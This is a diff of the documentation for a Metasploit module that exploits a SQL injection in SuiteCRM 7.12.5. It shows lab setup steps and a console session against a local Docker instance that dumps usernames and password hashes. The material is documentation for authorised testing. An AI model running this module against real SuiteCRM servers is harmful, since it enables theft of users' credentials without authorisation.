@@ -5,10 +5,11 @@ hashes from the SuiteCRM database.
 
 ## Vulnerable Application
 
-The SQLi exploited by this module depends on the existence of at least one 'Account' being registered in SuiteCRM. 
-An account can be added by authenticating to the GUI. Then at the top of the screen, click the 'Create' dropdown, 
-select 'Create Accounts'. The Name field is the only required field, input a name, click save and the target should 
-be exploitable.
+The SQLi exploited by this module depends on the existence of at least one 'Account' being registered in SuiteCRM.
+There should be one in SuiteCRM by default for the administrative user. If you want to test multiple users,
+browse to `/index.php?module=Users&action=index` and then click the `Create New User` button on the left side
+of the screen. Then enter a username and a last name. Then click the `password` tab, and enter a password for
+the user, then confirm this password and click the `Save` button to create the user.
 
 ### Docker compose
 
@@ -122,19 +123,51 @@ The following setup was installed on Ubuntu 20.04:
 
 ## Scenarios
 
-### SuiteCRM 7.12.5 running on Ubuntu 20.04
+### SuiteCRM 7.12.5 Bitnami Docker Image
 ```
-msf6 auxiliary(gather/suite_crm_export_sqli) > set rhosts 192.168.123.207
-rhosts => 192.168.123.207
-msf6 auxiliary(gather/suite_crm_export_sqli) > set username normal_user
-username => normal_user
-msf6 auxiliary(gather/suite_crm_export_sqli) > set password normal_user
-password => normal_user
-rmsf6 auxiliary(gather/suite_crm_export_sqli)) > run
+msf6 payload(windows/x64/meterpreter/reverse_tcp) > use auxiliary/gather/suite_crm_export_sqli 
+msf6 auxiliary(gather/suite_crm_export_sqli) > show options
+
+Module options (auxiliary/gather/suite_crm_export_sqli):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   COUNT     3                no        Number of users to enumerate
+   PASSWORD                   yes       Password for user
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasp
+                                        loit
+   RPORT     80               yes       The target port (TCP)
+   SSL       false            no        Negotiate SSL/TLS for outgoing connections
+   USERNAME                   yes       Username of user
+   VHOST                      no        HTTP server virtual host
+
+
+Auxiliary action:
+
+   Name              Description
+   ----              -----------
+   Dump credentials  Dumps usernames and passwords from the users table
+
+
+msf6 auxiliary(gather/suite_crm_export_sqli) > set USERNAME user
+USERNAME => user
+msf6 auxiliary(gather/suite_crm_export_sqli) > set PASSWORD bitnami
+PASSWORD => bitnami
+msf6 auxiliary(gather/suite_crm_export_sqli) > set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+msf6 auxiliary(gather/suite_crm_export_sqli) > check
+
+[*] Authenticating as user
+[+] Authenticated as: user
+[*] Version detected: 7.12.5
+[+] 127.0.0.1:80 - The target is vulnerable.
+msf6 auxiliary(gather/suite_crm_export_sqli) > run
+[*] Running module against 127.0.0.1
 
 [*] Running automatic check ("set AutoCheck false" to disable)
-[*] Authenticating as normal_user
-[+] Authenticated as: normal_user
+[*] Authenticating as user
+[+] Authenticated as: user
 [*] Version detected: 7.12.5
 [+] The target is vulnerable.
 [*] Fetching Users, please wait...
@@ -143,26 +176,20 @@ SuiteCRM User Names
 
  Username
  --------
- JoeDerp
- admin
- msfuser
- non_admin
+ testuser
+ user
 
 [*] Fetching Hashes, please wait...
-[+] (1/4) Username : admin ; Hash : $2y$10$TqjKZ4dWGNYQGiwDu5qSUu0RIsAO7uPRdIvX7gIm4pwjn.2t4ZYvi
-[+] (2/4) Username : JoeDerp ; Hash : $2y$10$Qt4iloeWIQhgVX85cMNHieGVXYltvC/7fDaY1y5MhM90SZpENSJCm
-[+] (3/4) Username : msfuser ; Hash : $2y$10$kr3tWzSZDbM9/y.FLZKf2esC1aghyEMa4e8KovsCCUE/GHlBjkgLe
-[+] (4/4) Username : non_admin ; Hash : $2y$10$A.yaUnsujWh38ODrekuv0OxUGdPRcvKmgpYStJib5VoFigjQQDsfy
+[+] (1/2) Username : testuser ; Hash : $2y$10$YFr9.QNPVDXoLKv5FQo7d.UIRBSMTnPGDS2LLHsuGSojAA2Q5kELa
+[+] (2/2) Username : user ; Hash : $2y$10$O83wcCVEfY7GKo//dbQwwOFOevfLFnhpP4d9n98HmGM2YPxJZqMhO
 SuiteCRM User Credentials
 =========================
 
- Username   Hash
- --------   ----
- JoeDerp    $2y$10$Qt4iloeWIQhgVX85cMNHieGVXYltvC/7fDaY1y5MhM90SZpENSJCm
- admin      $2y$10$TqjKZ4dWGNYQGiwDu5qSUu0RIsAO7uPRdIvX7gIm4pwjn.2t4ZYvi
- msfuser    $2y$10$kr3tWzSZDbM9/y.FLZKf2esC1aghyEMa4e8KovsCCUE/GHlBjkgLe
- non_admin  $2y$10$A.yaUnsujWh38ODrekuv0OxUGdPRcvKmgpYStJib5VoFigjQQDsfy
+ Username  Hash
+ --------  ----
+ testuser  $2y$10$YFr9.QNPVDXoLKv5FQo7d.UIRBSMTnPGDS2LLHsuGSojAA2Q5kELa
+ user      $2y$10$O83wcCVEfY7GKo//dbQwwOFOevfLFnhpP4d9n98HmGM2YPxJZqMhO
 
-[*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
+msf6 auxiliary(gather/suite_crm_export_sqli) > 
 ```
